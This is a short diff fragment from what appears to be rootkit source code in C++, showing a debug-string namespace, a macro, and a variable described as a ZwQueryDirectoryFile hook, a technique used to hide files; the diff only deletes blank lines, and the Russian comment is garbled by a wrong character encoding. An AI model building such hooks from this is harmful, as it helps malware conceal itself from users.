@@ -32,8 +32,6 @@ namespace ROOTKITDEBUGSTRINGS
 // ќбъ€вл€ем шаблон вывода отладочных строк
 #define RTKDBG ROOTKITDEBUGSTRINGS::DBGOutMessage<>
 
-
-
 //---------------------------------------------------------------------------
 
 DWORD dwAddrDirProc = 0; // ZwQueryDirectoryFile hook
